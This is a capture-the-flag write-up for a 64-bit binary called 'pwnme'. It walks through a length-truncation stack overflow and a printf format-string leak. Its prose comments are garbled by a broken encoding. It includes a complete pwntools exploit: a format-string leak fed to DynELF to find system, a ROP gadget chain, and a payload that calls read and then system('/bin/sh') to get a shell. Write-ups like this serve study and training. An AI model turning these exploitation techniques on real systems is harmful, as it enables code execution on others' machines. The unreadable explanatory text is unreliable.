# i����2016-11 pwnme

## checksec
```
64bit
RELRO: Full RELORD
Stack: No canary found ���Ը���ջ
NX: enable ջ������ִ��
PIE: NO PIE
```

## ����С��©����ջ���©��

��0x400BAF����read���صĶ�ȡ�����ֽ���ת����byte��⣬0x110�����ֽ����ͱ���˼��0x10<br>
```
.text:0000000000400BB2 038 mov     eax, [rbp+var_18]
.text:0000000000400BB5 038 mov     [rbp+byte_bufsize], al   ; ��read���ص��ֽ���ת��Ϊbyte����
.text:0000000000400BB8 038 cmp     [rbp+byte_bufsize], 0 ; byte(size:buf) != 0
.text:0000000000400BBC 038 jnz     short loc_400C0C ; Jump if Not Zero (Z
-----
.text:0000000000400C0C     loc_400C0C:             ; Compare Two Operands
.text:0000000000400C0C 038 cmp     [rbp+byte_bufsize], 14h
.text:0000000000400C10 038 ja      short loc_400C8E ; Jump if Above (CF=0 &
```
������ȫ��������0x110��bytes��password�����ҳ��򲻻��鵽����<br>
Ȼ���������һ������ֵ��ע��<br>
```
text:0000000000400A90 000 push    rbp
.text:0000000000400A91 008 mov     rbp, rsp
.text:0000000000400A94 008 sub     rsp, 30h        ; Integer Subtraction
.text:0000000000400A98 038 mov     [rbp+src], rdi
.text:0000000000400A9C 038 mov     [rbp+var_2C], esi
.text:0000000000400A9F 038 lea     rax, [rbp+s]    ; Load Effective Address
.text:0000000000400AA3 038 mov     edx, 14h        ; n
.text:0000000000400AA8 038 mov     esi, 0          ; c
.text:0000000000400AAD 038 mov     rdi, rax        ; s
.text:0000000000400AB0 038 call    memset          ; Call Procedure
.text:0000000000400AB5 038 mov     eax, [rbp+var_2C]
.text:0000000000400AB8 038 movsxd  rdx, eax        ; n
.text:0000000000400ABB 038 mov     rcx, [rbp+src]
.text:0000000000400ABF 038 lea     rax, [rbp+s]    ; Load Effective Address
.text:0000000000400AC3 038 mov     rsi, rcx        ; src
.text:0000000000400AC6 038 mov     rdi, rax        ; dest
.text:0000000000400AC9 038 call    memcpy          ; Call Procedure
.text:0000000000400ACE 038 nop                     ; No Operation
.text:0000000000400ACF 038 leave                   ; High Level Procedure Exit
.text:0000000000400AD0 000 retn                    ; Return Near from Procedure
.text:0000000000400AD0     exp_p endp
```
���Կ�������������memcpy�����Ե�ջ��������ҳ���Ҳû�п���ջ���� <br>
0x400AD0�¶ϵ���Բ鿴���������ͨ�����Ժ����׵õ�ֻҪ���� 40bytes+���ص�ַ ��

## printf��ʽ��©��
�������������һ��©���㣬����
```
.text:0000000000400AD1 000 push    rbp
.text:0000000000400AD2 008 mov     rbp, rsp
.text:0000000000400AD5 008 lea     rdi, [rbp+in_name] ; format
.text:0000000000400AD9 008 mov     eax, 0
.text:0000000000400ADE 008 call    printf          ; Call Procedure
.text:0000000000400AE3 008 lea     rax, [rbp+in_password] ; ����ֱ�Ӱ�������ַ���printf
.text:0000000000400AE7 008 mov     rdi, rax        ; format
.text:0000000000400AEA 008 mov     eax, 0
.text:0000000000400AEF 008 call    printf          ; Call Procedure
.text:0000000000400AF4 008 nop                     ; No Operation
.text:0000000000400AF5 008 pop     rbp
.text:0000000000400AF6 000 retn                    ; Return Near from Procedure
.text:0000000000400AF6     show_info endp
```
�������printf��ʽ�����©��<br>
��������printf("%12$s") ���Դ�ӡ��ʽ���ַ��������12������(����ο�[printf exploit](http://www.freebuf.com/articles/system/74224.html))<br>
����'%12$sAAAAAAACC\n'����<br>
gdb ����b *0x400AEF ���۲�printfִ��<br>

```
 ? 0x7ffff7a69340 <printf>       sub    rsp, 0xd8
   0x7ffff7a69347 <printf+7>     test   al, al
   0x7ffff7a69349 <printf+9>     mov    qword ptr [rsp + 0x28], rsi
   0x7ffff7a6934e <printf+14>    mov    qword ptr [rsp + 0x30], rdx
   0x7ffff7a69353 <printf+19>    mov    qword ptr [rsp + 0x38], rcx
   0x7ffff7a69358 <printf+24>    mov    qword ptr [rsp + 0x40], r8
   0x7ffff7a6935d <printf+29>    mov    qword ptr [rsp + 0x48], r9
   0x7ffff7a69362 <printf+34>    je     printf+91                     <0x7ffff7a6939b>
```
����ջ�ϵ���������Ϊ rsi->rdx->rcx->r8->r9 <br>
rdi�����������ַ���<br>
�����ں�����ת�˺ܾã���Щ�ط������Ǻ�����<br>

### printf����ִ�й���
���� printf�Ҳ���̫���������д��һ���̳������������й���<br>
��������<br>
```
#include <stdio.h>

int main(int argc, char *argv[])
{
    char str[1024];
    scanf("%s", str);
    printf("%12$s","A","B","C","D","E","F","G","H","I","J","K");
	printf(str);
    return 0;
}
```
�ڵ�һ��printf�¶ϵ㿴ջ�����<br>
```
[��������������������������������������������������������������������������������������������������������������������������������������������������������������REGISTERS��������������������������������������������������������������������������������������������������������������������������������������������������������������]
 RAX  0x0
 RBX  0x0
 RCX  0x4006d8 <�� add    byte ptr [r10], al /* 'C' */
 RDX  0x4006da <�� add    byte ptr [rcx], al /* 'B' */
 RDI  0x4006de <�� and    eax, 0x73243231 /* '%12$s' */
 RSI  0x4006dc <�� add    byte ptr [rip + 0x73243231], spl /* 'A' */
 R8   0x4006d6 <�� add    byte ptr [rbx], r8b /* 'D' */
 R9   0x4006d4 <�� add    byte ptr [r8 + rax + 0x43], r8b /* 'E' */
 R10  0x7fffffffddd0 <�� 0x0
 R11  0x7ffff7a36e50 (__libc_start_main) ?�� push   r14
 R12  0x4004b0 (_start) ?�� xor    ebp, ebp
 R13  0x7fffffffe020 ?�� 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdf40 ?�� 0x0
 RSP  0x7fffffffdae0 ��? 0x4006ee ?�� add    byte ptr [rcx], r8b /* 'F' */
 RIP  0x40061f (main+130) ?�� call   0x400480
[������������������������������������������������������������������������������������������������������������������������������������������������������������������CODE��������������������������������������������������������������������������������������������������������������������������������������������������������������������]
 ? 0x40061f <main+130>    call   printf@plt                    <0x400480>
        format: 0x4006de ?�� 0x4b007324323125 /* '%12$s' */
        vararg: 0x4006dc ?�� add    byte ptr [rip + 0x73243231], spl /* 'A' */
 
   0x400624 <main+135>    mov    eax, 0
   0x400629 <main+140>    mov    rbx, qword ptr [rbp - 0x18]
   0x40062d <main+144>    xor    rbx, qword ptr fs:[0x28]
   0x400636 <main+153>    je     main+160                      <0x40063d>
 
   0x400638 <main+155>    call   __stack_chk_fail@plt          <0x400470>
 
   0x40063d <main+160>    add    rsp, 0x458
   0x400644 <main+167>    pop    rbx
   0x400645 <main+168>    pop    rbp
   0x400646 <main+169>    ret    
 
   0x400647               nop    word ptr [rax + rax]
[������������������������������������������������������������������������������������������������������������������������������������������������������������������STACK������������������������������������������������������������������������������������������������������������������������������������������������������������������]
00:0000�� rsp  0x7fffffffdae0 ��? 0x4006ee ?�� add    byte ptr [rcx], r8b /* 'F' */
01:0008��      0x7fffffffdae8 ��? 0x4006ec ?�� add    byte ptr [r14], r8b /* 'G' */
02:0010��      0x7fffffffdaf0 ��? 0x4006ea ?�� add    byte ptr [rdi], al /* 'H' */
03:0018��      0x7fffffffdaf8 ��? 0x4006e8 ?�� add    byte ptr [r8], cl /* 'I' */
04:0020��      0x7fffffffdb00 ��? 0x4006e6 ?�� add    byte ptr [rcx], cl /* 'J' */
05:0028��      0x7fffffffdb08 ��? 0x4006e4 ?�� add    byte ptr [r10], cl /* 'K' */
06:0030��      0x7fffffffdb10 ��? 0x7fffffffe028 ��? 0x7fffffffe381 ?�� '/home/dfe/Deskt...'
07:0038��      0x7fffffffdb18 ?�� 0x1f7de4961
```
����ͺ�����ˣ��������ǰ���rsi->rdx->rcx->r8->r9->stack0->stack1...��ŵġ�����Ϳ���֪��stack0�����6������ <br>
Ȼ��û��"ABC..."�Ȳ�����printf<br>
���ڶ���printfλ��<br>
```
[������������������������������������������������������������������������������������������������������������������������������������������������������������������STACK������������������������������������������������������������������������������������������������������������������������������������������������������������������]
00:0000�� rsp    0x7fffffffdb20 ��? 0x7fffffffe028 ��? 0x7fffffffe381 ?�� '/home/dfe/Deskt...'
01:0008��        0x7fffffffdb28 ?�� 0x1f7ff7d40
02:0010�� rdi    0x7fffffffdb30 ?�� '%5$sfffcccccc'
03:0018�� r10-5  0x7fffffffdb38 ?�� 0x6363636363 /* 'ccccc' */
04:0020��        0x7fffffffdb40 ��? 0x7ffff7a25dc8 ?�� add    byte ptr [rax + 0x64], bh
05:0028��        0x7fffffffdb48 ��? 0x7ffff7dda420 ?�� add    qword ptr [rax], r8
06:0030��        0x7fffffffdb50 ?�� 0x100000000
07:0038��        0x7fffffffdb58 ?�� 0x1000008a5
```
���printf("%6$s")�ͻ�õ�'/home/dfe/Deskt...'<br>

### pwnme��leak
��pwnme�ڵڶ���printf�¶ϵ㣬���������passwordΪ'%12$sAAAAAAACCCCCCC\n'<br>
```
[������������������������������������������������������������������������������������������������������������������������������������������������STACK��������������������������������������������������������������������������������������������������������������������������������������������������]
00:0000�� rbp rsp  0x7fffffffde50 ��? 0x7fffffffde90 ��? 0x7fffffffdf40 ?�� 0x0
01:0008��          0x7fffffffde58 ��? 0x400d32 ?�� add    rsp, 0x30
02:0010��          0x7fffffffde60 ?�� 0xa333231 /* '123\n' */
03:0018��          0x7fffffffde68 ?�� 0x0
04:0020�� rdi-4    0x7fffffffde70 ?�� 0x2432312500000000
05:0028��          0x7fffffffde78 ?�� 'scccccccAAAAAAA...'
06:0030��          0x7fffffffde80 ?�� 'AAAAAAA\n\x0b\r@'
07:0038��          0x7fffffffde88 ��? 0x400d0b ?�� cmp    eax, 2
```
������Կ���rdi-4�ĵط����Ǵ�ŵ��ַ����������CCCCCCC\n�����0x7fffffffde78��<br>
��ǰ���printf�ķ�����֪��0x7fffffffde50�����ַ��ֵ�൱�ڵ�6���������Դ���������(���߼���)��0x7fffffffde80���ǵ�12������<br>
����[muʦ����exp](http://o0xmuhe.me/2016/11/07/Baiudu%E6%9D%AF-pwn%E4%B8%93%E5%9C%BA%E8%AE%B0%E5%BD%95/) �о������� **"%12$s"+"AAAAAAA" + p64(addr)**й¶��addr��ֵ<br>
����ѧ���ˣ�%һ��muʦ������������������DynELFŪ��system��ַ�ˣ�ֱ����pwntools�Դ��ĺ���
```
from pwn import *
dbg_flag = True
if dbg_flag:
    elf = ELF('./pwnme')
    context(log_level='debug')
    p = process('./pwnme')

def create_account():
    p.recvuntil('40):')
    p.sendline('mName')
    p.recvuntil('40):')
    p.sendline('mPaswd')

def leak(addr):
    p.recvuntil('>')
    p.sendline('2')
    p.recvuntil('lenth:20):')
    p.sendline('name')
    p.recvuntil('lenth:20):')
    payload = '%12$s' + 'AAAAAAA' + p64(addr)
    gdb.attach(proc.pidof(p)[0])
    p.send(payload)
    p.recvuntil('>')
    p.sendline('1')
    data = p.recvuntil('AAAAAAA')
    if(len(data) == 12):
        log.info('Null')
        return '\x00'
    else:
        log.info("%#x -- > %s" % (addr,(data[5:-7] or '').encode('hex')))
        return data[5:-7]

create_account()
dyn = DynELF(leak, elf=ELF('./pwnme'))
system_addr = dyn.lookup('system', 'libc')
log.info("system addr:" + hex(system_addr))
```
�����leak����system�ĵ�ַ<br>

## payload�ı�д
���������system�ĵ�ַ������ֻҪ����rop���Ϳ�����<br>
������Ҷ����rop�������Ժ����ֱ�Ӹ��ƣ�ֻҪ����صĵ�ַ�ҵ�������<br>
```
# @func_addr : �����ĵ�ַ(ע��һ��Ҫ��got���е��Ǹ�)
# @arg1,2,3  : ��������
# init_ret1  : pop5ret_addr֮��ķ��ص�ַ��һ����Բ��޸�
# init_ret2  : call func_addr ֮��ķ��ص�ַ�����Ը���ʵ���������
def gadget_call(func_addr, arg1=0, arg2=0, arg3=0, init_ret1=movcall_addr, init_ret2=vulnfunc_addr):
    payload = overwrite
    payload += p64(pop5ret_addr)
    payload += p64(0)   # rbx
    payload += p64(1)   # rbp
    payload += p64(func_addr)
    payload += p64(arg3) + p64(arg2) + p64(arg1)
    payload += p64(init_ret1)    # call 
    payload += '\x00'*(7*0x8)       # pop7
    payload += p64(init_ret2)   # ��󷵻ص���©���ĵط��´��ٴ�����
    return payload
```
ͨ��֮ǰ��ѧϰ����Щ��ַ�������ҵ�<br>
```
rwdata_addr = 0x602000
overwrite = 'A'*40
pop5ret_addr = 0x400eca
movcall_addr = 0x400eb0
vulnfunc_addr = 0x400CE9
poprdiret_addr = 0x400ed3
read_got = 0x601FC8
log.info('got.read: ' + hex(read_got))
```
����Ҫע�����elf.got�����ķ�ʽ�����ǲ�����got���(��֪��Ϊʲôorz)<br>
Ȼ��expҲ�ͱȽϼ���<br>
```
def exp(system_address):
    p.recvuntil('>')
    # edit name and password
    p.sendline('2')
    p.recvuntil('lenth:20):')
    p.sendline('name')
    p.recvuntil('lenth:20):')
    payload = gadget_call(read_got, arg1=0, arg2=rwdata_addr, arg3=0x08, init_ret2=poprdiret_addr)  # ����read(0,rwdata_addr,8)���ҷ��ص�ַ����pop rdi; ret;
    payload += p64(rwdata_addr) + p64(system_address)       # ����system(rwdata_addr)
    payload += 'A'*(0x110-len(payload))
    p.send(payload)
    p.sendline('/bin/sh\x00')   # ����shell�ַ���
    p.interactive()
```
������ֱ������һ��read�����޸����ݶ�Ϊ**'/bin/sh'**��Ȼ����ֱ��return��system�������õ�shell

## Summary
-- printf��ʽ��©���ܷ�������leak��<br>
-- �ջ����ľ�������Щ������ʪ����Ҫ���ڵ��ԣ������Լ�дһ���򵥵ĳ�����ԣ��۲�ջ�ѵ�ʹ��������������������̻���һ��������˽⡣<br>
-- DynELF����ֱ����pwntools�еĺ������ã�ʮ�ַ��㣬����Ҫ��Ҫleak������д��return�ķ���ֵһ��Ҫ��ʽ��ȷ<br>
-- �����еط��Ƚϼ��ԣ�������ʵ�ܶ�̶̳���QAQ������google�ɡ�<br>

## Reference
1. [Swingʦ��](http://wing3.cn/2016/11/08/ichuqiu-pwn-November/)<br>
2. [muhe](http://o0xmuhe.me/2016/11/07/Baiudu%E6%9D%AF-pwn%E4%B8%93%E5%9C%BA%E8%AE%B0%E5%BD%95/)<br>
3. [printf���](http://nlfox.com/2015/03/30/%E5%AD%A6%E4%B9%A0%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/)<br>
